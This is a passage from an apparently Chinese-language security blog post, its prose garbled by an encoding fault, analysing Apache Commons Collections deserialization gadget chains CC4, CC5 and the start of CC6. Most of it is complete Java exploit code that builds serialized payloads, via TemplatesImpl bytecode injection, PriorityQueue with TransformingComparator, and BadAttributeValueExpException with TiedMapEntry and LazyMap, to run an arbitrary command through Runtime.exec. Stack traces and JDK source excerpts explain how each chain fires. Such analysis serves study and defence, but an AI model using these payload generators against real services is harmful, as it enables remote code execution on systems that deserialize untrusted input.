<p>å¦å¤–å¯ä»¥åœ¨åŸæœ‰åˆ©ç”¨é“¾çš„åŸºç¡€ä¸Šå°† <code>TrAXFilter.class</code> å­˜åˆ° <code>PriorityQueue</code> ä¸­ï¼Œè¿™æ ·æ¯”è¾ƒçš„æ—¶å€™ä¼ å…¥ <code>TransformingComparator#compare</code> ä¸­çš„å‚æ•°ç›´æ¥å°±æ˜¯  <code>TrAXFilter.class</code>ï¼Œä»è€Œçœç•¥ä¸€ä¸ª <code>ConstantTransformer</code> è®© <code>ChainedTransformer</code> ä¸­å…ƒç´ æ•°é‡å‡å°‘ä¸º 1ï¼Œè¿›è€Œå¯ä»¥çœç•¥ <code>ChainedTransformer</code>ã€‚</p>
<h4 id="åˆ©ç”¨ä»£ç ï¼ˆCC4ï¼‰-1"><a href="#åˆ©ç”¨ä»£ç ï¼ˆCC4ï¼‰-1" class="headerlink" title="åˆ©ç”¨ä»£ç ï¼ˆCC4ï¼‰"></a>åˆ©ç”¨ä»£ç ï¼ˆCC4ï¼‰</h4><p>ç”±äºæ˜¯åœ¨ CC2 çš„åŸºç¡€ä¸Šå®ç°çš„ï¼Œå› æ­¤åªèƒ½é€‚ç”¨äº commons-collections4ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections4</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = getEvilClass(cmd);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;TrAXFilter.class, TrAXFilter.class&#125;);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> queue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(cmd));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClass(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ctClass.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">        ctClass.makeClassInitializer()</span><br><span class="line">                .setBody(<span class="string">&quot;&#123; java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;); &#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">at org.apache.commons.collections.functors.ChainedTransformer.transform(ChainedTransformer.java:122)</span><br><span class="line">at org.apache.commons.collections.map.LazyMap.get(LazyMap.java:158)</span><br><span class="line">at org.apache.commons.collections.keyvalue.TiedMapEntry.getValue(TiedMapEntry.java:74)</span><br><span class="line">at org.apache.commons.collections.keyvalue.TiedMapEntry.toString(TiedMapEntry.java:132)</span><br><span class="line">at javax.management.BadAttributeValueExpException.readObject(BadAttributeValueExpException.java:86)</span><br></pre></td></tr></table></figure></div>

<h4 id="åŸç†åˆ†æï¼ˆBadAttributeValueExpExceptionâ†’TiedMapEntryâ†’LazyMapï¼‰"><a href="#åŸç†åˆ†æï¼ˆBadAttributeValueExpExceptionâ†’TiedMapEntryâ†’LazyMapï¼‰" class="headerlink" title="åŸç†åˆ†æï¼ˆBadAttributeValueExpExceptionâ†’TiedMapEntryâ†’LazyMapï¼‰"></a>åŸç†åˆ†æï¼ˆBadAttributeValueExpExceptionâ†’TiedMapEntryâ†’LazyMapï¼‰</h4><p><code>javax.management.BadAttributeValueExpException</code> åœ¨ååºåˆ—åŒ– <code>readObject</code> æ—¶å¦‚æœæ»¡è¶³ <code>System.getSecurityManager() == null</code>ï¼ˆå®é™…è°ƒè¯•å‘ç°ç¡®å®è¿”å› <code>null</code>ï¼‰æ¡ä»¶æ—¶ä¼šå¯¹å…¶ä¸­çš„ <code>val</code> æˆå‘˜è°ƒç”¨ <code>toString</code> æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">        val = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span> <span class="comment">// ğŸ“Œ System.getSecurityManager() éœ€è¦è¿”å› null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString(); <span class="comment">// ğŸ‘ˆ è°ƒç”¨ val æˆå‘˜çš„ toString æ–¹æ³•</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è€Œ <code>TiedMapEntry</code> çš„ <code>toString</code> æ–¹æ³•æœ€ç»ˆä¼šè°ƒç”¨åˆ° <code>map.get</code> æ–¹æ³•ï¼Œæ­£å¥½å¯ä»¥ä¸ <code>LazyMap</code> çš„åˆ©ç”¨é“¾ç»“åˆã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getKey() + <span class="string">&quot;=&quot;</span> + getValue();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="åˆ©ç”¨ä»£ç ï¼ˆCC3-CC4ï¼‰-2"><a href="#åˆ©ç”¨ä»£ç ï¼ˆCC3-CC4ï¼‰-2" class="headerlink" title="åˆ©ç”¨ä»£ç ï¼ˆCC3&#x2F;CC4ï¼‰"></a>åˆ©ç”¨ä»£ç ï¼ˆCC3&#x2F;CC4ï¼‰</h4><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections5</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;cmd&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, Runtime.class);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exception</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(exception, <span class="string">&quot;val&quot;</span>, entry);</span><br><span class="line">        <span class="keyword">return</span> exception;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(cmd));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections5</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;cmd&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.lazyMap(innerMap, transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, Runtime.class);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exception</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(exception, <span class="string">&quot;val&quot;</span>, entry);</span><br><span class="line">        <span class="keyword">return</span> exception;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(cmd));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">at org.apache.commons.collections.functors.ChainedTransformer.transform(ChainedTransformer.java:122)</span><br><span class="line">at org.apache.commons.collections.map.LazyMap.get(LazyMap.java:158)</span><br><span class="line">at org.apache.commons.collections.keyvalue.TiedMapEntry.getValue(TiedMapEntry.java:74)</span><br><span class="line">at org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode(TiedMapEntry.java:121)</span><br><span class="line">at java.util.HashMap.hash(HashMap.java:338)</span><br><span class="line">at java.util.HashMap.readObject(HashMap.java:1397)</span><br></pre></td></tr></table></figure></div>

